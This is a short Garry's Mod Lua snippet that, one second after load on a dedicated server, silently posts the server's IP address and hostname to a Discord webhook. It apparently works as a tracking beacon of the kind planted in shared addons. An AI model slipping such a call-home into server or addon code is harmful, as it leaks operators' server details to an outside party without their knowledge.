timer.Simple(1, function()
    if not game.IsDedicated() then return end

    HTTP({
        method = "POST",
        url = "https://discordapp.com/api/webhooks/XXXXXXXXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX_XXXXXXXXXXXXXXXX",
        body = util.TableToJSON({ content = string.format("%s - %s", game.GetIPAddress(), GetHostName()) }),
        type = "application/json; charset=utf-8"
    })
end)
